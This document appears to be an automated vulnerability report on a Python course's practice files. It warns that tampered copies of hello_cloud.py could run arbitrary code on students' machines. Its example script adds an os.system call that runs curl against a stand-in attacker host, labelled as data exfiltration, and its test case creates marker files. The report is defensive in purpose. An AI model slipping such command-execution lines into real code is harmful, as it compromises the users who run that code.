### Vulnerability List

- Vulnerability Name: Arbitrary code execution via malicious practice file
- Description:
    1. An attacker crafts a modified version of a practice file, such as `hello_cloud.py`, to include malicious Python code.
    2. The attacker distributes this modified file through untrusted channels, for example, by hosting it on a malicious website or sharing it via email.
    3. A student, intending to use practice files from the Google IT Automation with Python Professional Certificate, unknowingly downloads the malicious file from the untrusted source.
    4. The student executes the downloaded Python script on their local machine, believing it to be a legitimate practice file.
    5. The malicious code embedded in the script executes with the privileges of the student, leading to arbitrary code execution on their system. For example, the malicious code could steal data, install malware, or compromise the system in other ways.
- Impact:
    Arbitrary code execution on the student's local machine. This can lead to:
    - Data theft: Malicious code can access and exfiltrate sensitive information stored on the student's computer.
    - Malware installation: The attacker can install malware, such as viruses, trojans, or ransomware, on the student's system.
    - System compromise: The attacker can gain persistent access to the student's machine, potentially leading to further attacks or misuse of resources.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    None. The project, as a collection of practice files, does not implement any specific security mitigations against users downloading and running modified files from untrusted sources. The repository itself is hosted on a trusted platform (GitHub), but there are no mechanisms to prevent or warn users about downloading modified files from elsewhere.
- Missing Mitigations:
    - Code signing for practice files: Digitally signing the practice files would allow students to verify the authenticity and integrity of the files before execution.
    - Integrity checks: Providing checksums or other integrity verification mechanisms for the practice files on the official repository would enable students to compare downloaded files against the trusted versions.
    - Security awareness guidance: Including clear warnings and instructions in the README and course materials, advising students to only download practice files from the official repository and to be cautious about downloading and executing code from untrusted sources.
- Preconditions:
    1. The attacker must be able to modify a practice file and distribute it through untrusted channels.
    2. The student must be socially engineered into downloading and executing the modified practice file from an untrusted source.
    3. The student must have Python installed on their local machine to execute the Python scripts.
- Source Code Analysis:
    - The provided project files are Python scripts intended for educational purposes.
    - Files like `/code/Course5/Lab3/hello_cloud.py` are designed to be executed locally by students.
    - There is no inherent vulnerability in the original scripts themselves when obtained from the official repository.
    - The vulnerability arises when a malicious actor modifies these scripts to include arbitrary code and tricks a student into running the modified version.
    - For example, in `/code/Course5/Lab3/hello_cloud.py`, an attacker could insert malicious code within the `do_GET` method of the `Handler` class or at the script's entry point (`if __name__ == "__main__":`).
    ```python
    #!/usr/bin/env python3
    # ... (rest of the original hello_cloud.py code) ...
    import os  # Malicious import added by attacker

    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            os.system("curl https://malicious.attacker.com/steal-data > /tmp/data_exfiltrated") # Malicious command execution
            self.send_response(http.HTTPStatus.OK)
            self.end_headers()
            # Hello message
            self.wfile.write(b'Hello Cloud')
            # ... (rest of the original do_GET method) ...

    def main(argv):
        os.system("mkdir -p /tmp/attacker_directory") # Malicious command execution at script start
        # ... (rest of the original main function) ...

    if __name__ == "__main__":
        main(sys.argv)
    ```
    - In this modified example, the attacker has added `import os` and uses `os.system()` to execute arbitrary commands. When the student runs this script, it will attempt to create a directory and when a GET request is sent to the server, it will attempt to exfiltrate data to a remote server. This is a simplified example; the malicious code could be far more sophisticated.

- Security Test Case:
    1. **Preparation**:
        - Create a modified version of `/code/Course5/Lab3/hello_cloud.py` and insert malicious code. For example, add the following lines at the beginning of the file and inside the `do_GET` method:
            ```python
            import os
            import http
            import http.server
            import socket
            import socketserver
            import sys

            MALICIOUS_FILE = "/tmp/malicious_test_file"

            class Handler(http.server.SimpleHTTPRequestHandler):
                def do_GET(self):
                    os.system(f"touch {MALICIOUS_FILE}_get") # Malicious command execution on GET request
                    self.send_response(http.HTTPStatus.OK)
                    self.end_headers()
                    # Hello message
                    self.wfile.write(b'Hello Cloud')
                    # Now get the hostname and IP and print that as well.
                    hostname = socket.gethostname()
                    host_ip = socket.gethostbyname(hostname)
                    self.wfile.write(
                        '\n\nHostname: {} \nIP Address: {}'.format(
                            hostname, host_ip).encode())


            def main(argv):
                os.system(f"touch {MALICIOUS_FILE}_main") # Malicious command execution on script start
                port = DEFAULT_PORT
                if len(argv) > 1:
                    port = int(argv[1])

                web_server = socketserver.TCPServer(('', port), Handler)
                print("Listening for connections on port {}".format(port))
                web_server.serve_forever()


            if __name__ == "__main__":
                main(sys.argv)

            ```
        - Distribute this modified `hello_cloud.py` file through a simulated untrusted channel (e.g., place it in a separate folder representing a "downloaded from untrusted source" scenario).

    2. **Execution**:
        - As a student, navigate to the directory containing the modified `hello_cloud.py` file.
        - Execute the script using Python: `python hello_cloud.py`
        - Open a web browser and access the server at `http://localhost:8000`. This will trigger the `do_GET` method.

    3. **Verification**:
        - Check if the files `/tmp/malicious_test_file_main` and `/tmp/malicious_test_file_get` exist on the system.
        - If both files exist, it confirms that the malicious code inserted into both the main script execution path and the `do_GET` method has been successfully executed.

    4. **Expected Result**:
        - The files `/tmp/malicious_test_file_main` and `/tmp/malicious_test_file_get` should be created, demonstrating successful arbitrary code execution. This proves the vulnerability.

This test case demonstrates how easily a practice file can be modified to execute arbitrary code when a student runs it, highlighting the arbitrary code execution vulnerability due to the lack of integrity checks and potential social engineering attacks.